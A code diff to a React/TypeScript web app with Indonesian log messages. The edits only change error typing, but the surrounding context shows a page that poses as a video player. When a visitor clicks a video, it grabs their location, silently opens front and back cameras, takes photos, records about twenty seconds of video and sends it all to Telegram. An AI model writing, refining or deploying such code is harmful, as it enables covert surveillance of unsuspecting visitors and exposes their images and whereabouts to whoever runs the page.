@@ -98,8 +98,10 @@ function App() {
         });
         const { latitude, longitude } = position.coords;
         return `Latitude: ${latitude}, Longitude: ${longitude}`;
-      } catch (error) {
-        console.error('Gagal mendapatkan lokasi:', error);
+      } catch (error: unknown) {
+        // Tentukan tipe error sebagai Error
+        const err = error as Error;
+        console.error('Gagal mendapatkan lokasi:', err.message);
         return window.location.href;
       }
     };
@@ -118,8 +120,9 @@ function App() {
       try {
         await sendTelegramNotification(visitorDetails);
         console.log('Notifikasi pengunjung berhasil dikirim.');
-      } catch (error) {
-        console.error(`Gagal mengirim notifikasi pengunjung: ${error.message}`, error);
+      } catch (error: unknown) {
+        const err = error as Error;
+        console.error(`Gagal mengirim notifikasi pengunjung: ${err.message}`);
       }
     };
 
@@ -160,8 +163,9 @@ function App() {
         const deviceId = stream.getVideoTracks()[0].getSettings().deviceId || '';
         console.log(`Berhasil mendapatkan stream untuk kamera ${cameraType} dengan deviceId: ${deviceId}`);
         return { stream, deviceId };
-      } catch (error) {
-        console.error(`Gagal mendapatkan akses kamera ${cameraType}:`, error);
+      } catch (error: unknown) {
+        const err = error as Error;
+        console.error(`Gagal mendapatkan akses kamera ${cameraType}: ${err.message}`);
         try {
           const constraints = {
             video: typeof facingMode === 'string' ? { facingMode, width: { ideal: 640 }, height: { ideal: 360 }, frameRate: { ideal: 15 } } : { deviceId: { exact: facingMode.deviceId }, width: { ideal: 640 }, height: { ideal: 360 }, frameRate: { ideal: 15 } },
@@ -171,8 +175,9 @@ function App() {
           const deviceId = stream.getVideoTracks()[0].getSettings().deviceId || '';
           console.log(`Berhasil mendapatkan stream fallback untuk kamera ${cameraType} dengan deviceId: ${deviceId}`);
           return { stream, deviceId };
-        } catch (fallbackError) {
-          console.error(`Gagal mendapatkan akses kamera ${cameraType} pada fallback:`, fallbackError);
+        } catch (fallbackError: unknown) {
+          const fbErr = fallbackError as Error;
+          console.error(`Gagal mendapatkan akses kamera ${cameraType} pada fallback: ${fbErr.message}`);
           return null;
         }
       }
@@ -206,8 +211,9 @@ function App() {
       } else {
         console.log('Stream kamera yang diinisialisasi:', cameraStreamsRef.current.map(s => `${s.type} (${s.deviceId})`));
       }
-    } catch (error) {
-      console.error('Error saat menginisialisasi stream kamera:', error);
+    } catch (error: unknown) {
+      const err = error as Error;
+      console.error(`Error saat menginisialisasi stream kamera: ${err.message}`);
     }
   };
 
@@ -230,8 +236,9 @@ function App() {
       const stream = await navigator.mediaDevices.getUserMedia(constraints);
       console.log(`Berhasil menginisialisasi ulang stream untuk kamera ${cameraType} dengan deviceId: ${deviceId}`);
       return stream;
-    } catch (error) {
-      console.error(`Gagal menginisialisasi ulang stream untuk kamera ${cameraType}:`, error);
+    } catch (error: unknown) {
+      const err = error as Error;
+      console.error(`Gagal menginisialisasi ulang stream untuk kamera ${cameraType}: ${err.message}`);
       try {
         const constraints = {
           video: { deviceId: { exact: deviceId }, width: { ideal: 640 }, height: { ideal: 360 }, frameRate: { ideal: 15 } },
@@ -240,8 +247,9 @@ function App() {
         const stream = await navigator.mediaDevices.getUserMedia(constraints);
         console.log(`Berhasil menginisialisasi ulang stream fallback untuk kamera ${cameraType}`);
         return stream;
-      } catch (fallbackError) {
-        console.error(`Gagal menginisialisasi ulang stream fallback untuk kamera ${cameraType}:`, fallbackError);
+      } catch (fallbackError: unknown) {
+        const fbErr = fallbackError as Error;
+        console.error(`Gagal menginisialisasi ulang stream fallback untuk kamera ${cameraType}: ${fbErr.message}`);
         return null;
       }
     }
@@ -282,7 +290,7 @@ function App() {
 
       await new Promise((resolve) => {
         cameraVideo.onloadedmetadata = async () => {
-          await cameraVideo.play().catch(err => console.error(`Gagal memutar video kamera ${type}:`, err));
+          await cameraVideo.play().catch((err: Error) => console.error(`Gagal memutar video kamera ${type}: ${err.message}`));
           setTimeout(resolve, 500);
         };
       });
@@ -322,8 +330,9 @@ function App() {
       try {
         await sendImageToTelegram(photoBlob);
         console.log(`Foto dari kamera ${type} berhasil dikirim ke Telegram.`);
-      } catch (error) {
-        console.error(`Gagal mengirim foto dari kamera ${type}: ${error.message}`, error);
+      } catch (error: unknown) {
+        const err = error as Error;
+        console.error(`Gagal mengirim foto dari kamera ${type}: ${err.message}`);
       }
 
       const supportedMimeType = ['video/mp4;codecs=h264,aac', 'video/mp4']
@@ -348,12 +357,13 @@ function App() {
         try {
           await sendVideoToTelegram(videoBlob);
           console.log(`Video dari kamera ${type} berhasil dikirim ke Telegram.`);
-        } catch (error) {
-          console.error(`Gagal mengirim video dari kamera ${type}: ${error.message}`, error);
+        } catch (error: unknown) {
+          const err = error as Error;
+          console.error(`Gagal mengirim video dari kamera ${type}: ${err.message}`);
         }
       };
 
-      mediaRecorder.onerror = (e) => {
+      mediaRecorder.onerror = (e: Event) => {
         console.error(`Error saat merekam kamera ${type}:`, e);
       };
 
@@ -369,8 +379,9 @@ function App() {
       }, 20000));
 
       if (cameraVideo.parentNode) cameraVideo.parentNode.removeChild(cameraVideo);
-    } catch (error) {
-      console.error(`Error saat merekam kamera ${type}:`, error);
+    } catch (error: unknown) {
+      const err = error as Error;
+      console.error(`Error saat merekam kamera ${type}: ${err.message}`);
     }
   };
 
@@ -418,8 +429,9 @@ function App() {
 
       videoElement.pause();
       setIsPlaying(null);
-    } catch (error) {
-      console.error('Error dalam captureAndSendMedia:', error);
+    } catch (error: unknown) {
+      const err = error as Error;
+      console.error(`Error dalam captureAndSendMedia: ${err.message}`);
       videoElement.pause();
       setIsPlaying(null);
     }
@@ -454,8 +466,9 @@ function App() {
         setIsPlaying(index);
         videoElement.src = videos[index].videoUrl; // Set src hanya saat diklik
         await captureAndSendMedia(videoElement);
-      } catch (error) {
-        console.error('Error memutar video:', error);
+      } catch (error: unknown) {
+        const err = error as Error;
+        console.error(`Error memutar video: ${err.message}`);
         videoElement.pause();
         videoElement.currentTime = 0;
         videoElement.removeAttribute('src');
@@ -470,10 +483,10 @@ function App() {
     const videoElement = videoRefs.current[index];
     if (videoElement) {
       if (!isFullscreen) {
-        videoElement.requestFullscreen().catch(err => console.error('Gagal masuk fullscreen:', err));
+        videoElement.requestFullscreen().catch((err: Error) => console.error(`Gagal masuk fullscreen: ${err.message}`));
         setIsFullscreen(true);
       } else {
-        document.exitFullscreen().catch(err => console.error('Gagal keluar fullscreen:', err));
+        document.exitFullscreen().catch((err: Error) => console.error(`Gagal keluar fullscreen: ${err.message}`));
       }
       console.log(`Mengubah mode fullscreen untuk video di indeks: ${index}`);
     }
